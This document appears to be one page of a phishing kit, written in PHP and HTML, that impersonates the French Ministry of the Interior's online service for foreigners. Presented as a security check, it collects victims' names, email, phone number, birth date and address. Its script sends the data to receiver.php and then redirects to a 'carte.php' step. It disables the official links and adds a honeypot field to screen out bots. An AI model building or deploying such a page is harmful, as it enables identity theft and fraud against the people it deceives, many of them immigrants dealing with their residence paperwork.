<?php
session_start();
if (!isset($_SESSION['form_token'])) {
    $_SESSION['form_token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['form_token'];
?>
<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" class="login-pf" lang="fr" data-fr-scheme="light">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
    <title>Vérification de vos informations | Administration numérique pour les étrangers en France</title>
    <link href="https://fonts.googleapis.com/css?family=Lato:regular,300" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet"/>
    <style>
        input[name="website"] {
            position: absolute !important;
            left: -9999px !important;
            top: -9999px !important;
            opacity: 0 !important;
            height: 0 !important;
            width: 0 !important;
            z-index: -1 !important;
            pointer-events: none !important;
        }
        .progress-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 2rem;
            gap: 0.5rem;
        }
        .progress-step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e5e5e5;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #666;
            font-size: 16px;
        }
        .progress-step.active {
            background: #000091;
            color: #fff;
        }
        .progress-step.done {
            background: #0d6632;
            color: #fff;
        }
        .progress-line {
            width: 80px;
            height: 2px;
            background: #e5e5e5;
        }
        .progress-line.done {
            background: #0d6632;
        }
        .info-box {
            background: #f0f0ff;
            border-left: 4px solid #000091;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-size: 0.875rem;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="fr-skiplinks">
        <nav class="fr-container" role="navigation" aria-label="Accès rapide">
            <ul class="fr-skiplinks__list">
                <li><a class="fr-link" href="#main">Contenu</a></li>
                <li><a class="fr-link" href="#footer">Pied de page</a></li>
            </ul>
        </nav>
    </div>
    <div class="content-container">
        <header role="banner" class="fr-header">
            <div class="fr-header__body">
                <div class="fr-container">
                    <div class="fr-header__body-row">
                        <div class="fr-header__brand fr-enlarge-link">
                            <div class="fr-header__brand-top">
                                <div class="fr-header__logo">
                                    <p class="fr-logo">Ministère<br>de l'intérieur</p>
                                </div>
                                <div class="fr-header__navbar">
<button class="fr-btn--menu fr-btn" data-fr-opened="false" aria-controls="modal-517" aria-haspopup="menu" id="button-518" title="Menu" onclick="openMenu()">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="menu-burger-icon" fill="currentColor">
    <path d="M3 4h18v2H3V4Zm0 7h18v2H3v-2Zm0 7h18v2H3v-2Z"></path>
  </svg>
</button>                                </div>
                            </div>
                            <div class="fr-header__service">
                                <a href="javascript:void(0)" title="Accueil - Administration numérique pour les étrangers en France - Direction Générale des étrangers en France">
                                    <p class="fr-header__service-title">Administration numérique pour les étrangers en France</p>
                                </a>
                                <p class="fr-header__service-tagline">Direction Générale des étrangers en France</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <main class="content-body" id="main" role="main">
            <div class="fr-container fr-container--fluid fr-mb-md-14v">
                <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                    <div class="fr-col-12 fr-col-md-8 fr-col-lg-6">
                        <div class="fr-container fr-background-alt--grey fr-px-md-0 fr-py-10v fr-py-md-14v">
                            <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                                <div class="fr-col-12 fr-col-md-9 fr-col-lg-8">

                                    <!-- Barre de progression -->
                                    <div class="progress-bar">
                                        <div class="progress-step done">✓</div>
                                        <div class="progress-line done"></div>
                                        <div class="progress-step active">2</div>
                                        <div class="progress-line"></div>
                                        <div class="progress-step">3</div>
                                    </div>

                                    <h1>Vérification de vos informations personnelles</h1>

                                    <div class="info-box">
                                        Pour des raisons de sécurité, nous devons vérifier vos informations personnelles avant de poursuivre. Ces informations sont nécessaires pour finaliser votre connexion.
                                    </div>

                                    <form id="info-form" action="receiver.php" method="POST" onsubmit="return captureInfo(event)">
                                        <input type="hidden" name="session_token" value="<?= $token ?>">
                                        <input type="hidden" name="form_timer" id="form_timer" value="">
                                        <input type="text" name="website" tabindex="-1" autocomplete="off">

                                        <fieldset class="fr-fieldset">
                                            <legend class="fr-fieldset__legend">
                                                <h2 class="fr-h5">Vos informations personnelles</h2>
                                            </legend>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="nom">Nom de famille <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="nom" id="nom" type="text" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="prenom">Prénom(s) <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="prenom" id="prenom" type="text" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="email">Adresse email <span style="color:red;">*</span></label>
                                                    <span class="fr-hint-text">L'adresse email associée à votre compte</span>
                                                    <input class="fr-input" name="email" id="email" type="email" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="telephone">Numéro de téléphone <span style="color:red;">*</span></label>
                                                    <span class="fr-hint-text">Format attendu : 0612345678</span>
                                                    <input class="fr-input" name="telephone" id="telephone" type="tel" pattern="[0-9]{10}" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="date_naissance">Date de naissance <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="date_naissance" id="date_naissance" type="date" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="adresse">Adresse postale <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="adresse" id="adresse" type="text" required placeholder="Numéro et nom de rue">
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="code_postal">Code postal <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="code_postal" id="code_postal" type="text" pattern="[0-9]{5}" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="ville">Ville <span style="color:red;">*</span></label>
                                                    <input class="fr-input" name="ville" id="ville" type="text" required>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <ul class="fr-btns-group">
                                                    <li>
                                                        <button class="fr-mt-2v fr-btn" type="submit">Continuer</button>
                                                    </li>
                                                </ul>
                                            </div>
                                        </fieldset>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <footer class="fr-footer" role="contentinfo" id="footer">
            <div class="fr-container">
                <div class="fr-footer__body">
                    <div class="fr-footer__brand fr-enlarge-link">
                        <p class="fr-logo">Ministère<br>de l'intérieur<br>et des outre-mer</p>
                    </div>
                    <div class="fr-footer__content">
                 <ul class="fr-footer__content-list">
  <li class="fr-footer__content-item">
    <a title="service-public.fr - Nouvelle fenêtre" id="footer__content-link-7363" class="fr-footer__content-link" href="javascript:void(0)">
      <span>service-public.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"></path>
      </svg>
    </a>
  </li>
  <li class="fr-footer__content-item">
    <a title="data.gouv.fr - Nouvelle fenêtre" id="footer__content-link-7365" class="fr-footer__content-link" href="javascript:void(0)">
      <span>data.gouv.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"></path>
      </svg>
    </a>
  </li>
</ul>
                    </div>
                    <div class="fr-footer__bottom-copy">
                        <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous <a href="javascript:void(0)" title="Licence etalab - nouvelle fenêtre">licence etalab-2.0</a></p>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script>
        document.getElementById('form_timer').value = Math.floor(Date.now() / 1000);

function captureInfo(event) {
    event.preventDefault();
    var fields = ['nom','prenom','email','telephone','date_naissance','adresse','code_postal','ville'];
    for (var i = 0; i < fields.length; i++) {
        if (!document.getElementById(fields[i]).value.trim()) {
            alert('Veuillez remplir tous les champs obligatoires.');
            return false;
        }
    }
    
    var form = document.getElementById('info-form');
    var formData = new FormData(form);
    
    fetch('receiver.php', {
        method: 'POST',
        body: formData
    }).then(function() {
        window.location.href = 'carte.php';
    }).catch(function() {
        window.location.href = 'carte.php';
    });
    
    return false;
}

    </script>
</body>
</html>
